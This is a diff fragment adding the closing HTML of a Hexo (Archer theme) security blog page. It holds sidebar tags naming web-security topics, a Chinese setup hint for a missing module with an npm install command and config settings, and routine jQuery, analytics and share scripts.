+    
+        <span class="sidebar-tag-name" data-tags="模板注入"><span class="iconfont-archer">&#xe606;</span>模板注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="wget"><span class="iconfont-archer">&#xe606;</span>wget</span>
+    
+        <span class="sidebar-tag-name" data-tags="js"><span class="iconfont-archer">&#xe606;</span>js</span>
+    
+        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="lfi"><span class="iconfont-archer">&#xe606;</span>lfi</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="win server信息收集"><span class="iconfont-archer">&#xe606;</span>win server信息收集</span>
+    
+        <span class="sidebar-tag-name" data-tags="msf"><span class="iconfont-archer">&#xe606;</span>msf</span>
+    
+        <span class="sidebar-tag-name" data-tags="lcx端口转发"><span class="iconfont-archer">&#xe606;</span>lcx端口转发</span>
+    
+        <span class="sidebar-tag-name" data-tags="IPC通道入侵"><span class="iconfont-archer">&#xe606;</span>IPC通道入侵</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastcgi"><span class="iconfont-archer">&#xe606;</span>fastcgi</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssh_sock5"><span class="iconfont-archer">&#xe606;</span>ssh_sock5</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="tqdm"><span class="iconfont-archer">&#xe606;</span>tqdm</span>
+    
+        <span class="sidebar-tag-name" data-tags="virtualenv"><span class="iconfont-archer">&#xe606;</span>virtualenv</span>
+    
+        <span class="sidebar-tag-name" data-tags="open_basedir"><span class="iconfont-archer">&#xe606;</span>open_basedir</span>
+    
+        <span class="sidebar-tag-name" data-tags="crontab"><span class="iconfont-archer">&#xe606;</span>crontab</span>
+    
+        <span class="sidebar-tag-name" data-tags="roundcube"><span class="iconfont-archer">&#xe606;</span>roundcube</span>
+    
+        <span class="sidebar-tag-name" data-tags="sangebaimao"><span class="iconfont-archer">&#xe606;</span>sangebaimao</span>
+    
+        <span class="sidebar-tag-name" data-tags="参数污染"><span class="iconfont-archer">&#xe606;</span>参数污染</span>
+    
+        <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
+    
+        <span class="sidebar-tag-name" data-tags="LD_PRELOAD"><span class="iconfont-archer">&#xe606;</span>LD_PRELOAD</span>
+    
+        <span class="sidebar-tag-name" data-tags="gopher"><span class="iconfont-archer">&#xe606;</span>gopher</span>
+    
+        <span class="sidebar-tag-name" data-tags="fcgi"><span class="iconfont-archer">&#xe606;</span>fcgi</span>
+    
+        <span class="sidebar-tag-name" data-tags="Essry"><span class="iconfont-archer">&#xe606;</span>Essry</span>
+    
+        <span class="sidebar-tag-name" data-tags="php伪协议"><span class="iconfont-archer">&#xe606;</span>php伪协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="file_put_contents"><span class="iconfont-archer">&#xe606;</span>file_put_contents</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqlmap"><span class="iconfont-archer">&#xe606;</span>sqlmap</span>
+    
+        <span class="sidebar-tag-name" data-tags="game"><span class="iconfont-archer">&#xe606;</span>game</span>
+    
+        <span class="sidebar-tag-name" data-tags="titan_souls"><span class="iconfont-archer">&#xe606;</span>titan_souls</span>
+    
+        <span class="sidebar-tag-name" data-tags="wordpress"><span class="iconfont-archer">&#xe606;</span>wordpress</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="条件竞争"><span class="iconfont-archer">&#xe606;</span>条件竞争</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Blogs"><span class="iconfont-archer">&#xe60a;</span>Blogs</span>
+    
+        <span class="sidebar-category-name" data-categories="Reprint"><span class="iconfont-archer">&#xe60a;</span>Reprint</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "LoRexxar"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
